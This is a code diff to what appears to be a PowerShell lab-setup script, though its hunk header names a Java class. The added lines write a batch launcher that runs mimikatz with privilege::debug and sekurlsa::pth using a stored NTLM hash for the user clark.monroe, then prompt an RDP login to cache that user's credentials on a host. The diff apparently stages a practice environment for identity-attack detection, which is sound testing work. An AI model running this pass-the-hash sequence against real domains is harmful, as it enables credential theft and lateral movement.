@@ -967,12 +967,36 @@ public class CryptoMD4TGS {
 
             $doPtH = Read-Host "  Launch PtH prep? (Y/n)"
             if ($doPtH -ne 'n') {
+                # Write launcher batch. Key insight: mimikatz /run: passes the
+                # string directly to CreateProcessW. "cmd.exe /c batch.bat" works.
+                # No spaces in C:\IDP_Files path, so no nested quotes needed.
+                $pthLauncher = "$idpDir\launch_pth.bat"
+                $runCmd = "cmd.exe /k $prepBat"
+
+                # Build the batch file content using StringBuilder to avoid PS quoting issues
+                $sb = New-Object System.Text.StringBuilder
+                [void]$sb.AppendLine('@echo off')
+                [void]$sb.AppendLine('echo [*] Running mimikatz PtH as clark.monroe...')
+                [void]$sb.AppendLine('echo.')
+                [void]$sb.Append('"')
+                [void]$sb.Append($mimiExe)
+                [void]$sb.Append('" "privilege::debug" "sekurlsa::pth /user:clark.monroe /domain:')
+                [void]$sb.Append($env:ENV_DOMAIN)
+                [void]$sb.Append(' /ntlm:')
+                [void]$sb.Append($clarkHash)
+                [void]$sb.Append(' /run:')
+                [void]$sb.Append($runCmd)
+                [void]$sb.AppendLine('" "exit"')
+                [System.IO.File]::WriteAllText($pthLauncher, $sb.ToString(), [System.Text.Encoding]::ASCII)
+
+                Write-Host "  [+] Launcher written to $pthLauncher" -ForegroundColor Green
+
                 try {
-                    Start-Process -FilePath "cmd.exe" -ArgumentList "/k `"$mimiExe`" `"privilege::debug`" `"sekurlsa::pth /user:clark.monroe /domain:$env:ENV_DOMAIN /ntlm:$clarkHash /run:$prepBat`" `"exit`""
+                    Start-Process -FilePath "cmd.exe" -ArgumentList "/k `"$pthLauncher`""
                     Write-Host
                     Write-Host "  [+] PtH launched in new window." -ForegroundColor Green
                     Write-Host "  [*] Follow the prompts in that window." -ForegroundColor Cyan
-                    Write-Host "  [*] When RDP opens, just log in briefly then close." -ForegroundColor Cyan
+                    Write-Host "  [*] When RDP opens, log in briefly then close it." -ForegroundColor Cyan
                     Write-Host "  [*] After that, clark.monroe creds will be cached on DT." -ForegroundColor Cyan
                 } catch {
                     Write-Host "  [!] Error launching PtH: $_" -ForegroundColor Red
